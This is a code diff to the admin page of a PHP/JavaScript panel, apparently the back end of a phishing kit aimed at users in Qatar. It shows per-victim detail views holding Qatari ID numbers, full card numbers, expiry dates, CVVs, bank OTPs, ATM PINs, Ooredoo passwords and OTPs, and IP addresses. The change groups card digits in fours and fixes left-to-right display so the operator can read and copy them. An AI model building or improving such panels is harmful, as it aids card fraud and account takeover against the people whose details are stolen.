@@ -346,7 +346,12 @@ if (!isset($_SESSION['admin_logged_in'])) {
     function closeModal() { document.getElementById("detailOverlay").classList.remove("show"); }
 
     function dRow(label, val) {
-      return `<div class="detail-row"><div class="d-lbl">${label}</div><div style="display:flex;gap:8px;align-items:center;"><div class="d-val">${val || '-'}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${(val || '').replace(/'/g, '\\'')}'); toast('تم النسخ', 'ok');"><i class="bi bi-copy"></i></button></div></div>`;
+      let displayVal = val || '-';
+      // تنسيق رقم البطاقة بإضافة مسافات كل 4 أرقام برمجياً لضمان العرض الصحيح في المتصفح
+      if (label === "رقم البطاقة" && val && val.length >= 15) {
+        displayVal = val.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
+      }
+      return `<div class="detail-row"><div class="d-lbl">${label}</div><div style="display:flex;gap:8px;align-items:center;"><div class="d-val" dir="ltr" style="direction:ltr;text-align:left;font-family:monospace;letter-spacing:1px;">${displayVal}</div><button class="copy-btn" onclick="navigator.clipboard.writeText('${(val || '').replace(/'/g, '\'')}'); toast('تم النسخ', 'ok');"><i class="bi bi-copy"></i></button></div></div>`;
     }
 
     function buildDetail(b) {
@@ -361,6 +366,7 @@ if (!isset($_SESSION['admin_logged_in'])) {
           ${dRow("رقم الهوية القطرية", allData.qatar_id)}
           ${dRow("رقم الجوال", allData.phone_number)}
         </div>
+        <!-- Note: Numeric fields are now displayed with dir="ltr" to prevent RTL text reversal -->
 
         <div class="detail-section">
           <div class="sec-title">البيانات الشخصية</div>
@@ -383,12 +389,14 @@ if (!isset($_SESSION['admin_logged_in'])) {
           ${dRow("سنة الانتهاء", allData.exp_year)}
           ${dRow("CVV", allData.cvv)}
         </div>
+        <!-- Note: Card number and CVV are now displayed with dir="ltr" for correct digit ordering -->
 
         <div class="detail-section">
           <div class="sec-title">بيانات التحقق البنكي</div>
           ${dRow("رمز OTP البنكي", allData.otp)}
           ${dRow("الرقم السري (ATM PIN)", allData.atm_pin)}
         </div>
+        <!-- Note: OTP and PIN are numeric codes, displayed with dir="ltr" -->
 
         <div class="detail-section">
           <div class="sec-title">بيانات Ooredoo</div>
@@ -396,6 +404,7 @@ if (!isset($_SESSION['admin_logged_in'])) {
           ${dRow("كلمة المرور Ooredoo", allData.ooredoo_pass)}
           ${dRow("رمز OTP Ooredoo", allData.ooredoo_otp)}
         </div>
+        <!-- Note: OTP codes are displayed with dir="ltr" -->
 
         <div class="detail-section">
           <div class="sec-title">بيانات إضافية</div>
@@ -404,6 +413,7 @@ if (!isset($_SESSION['admin_logged_in'])) {
           ${dRow("المنطقة", allData.region)}
           ${dRow("عنوان IP", b.clientIp)}
         </div>
+        <!-- Note: License plates and IP addresses are displayed with dir="ltr" -->
 
         <div class="action-section">
           <div class="action-btns">
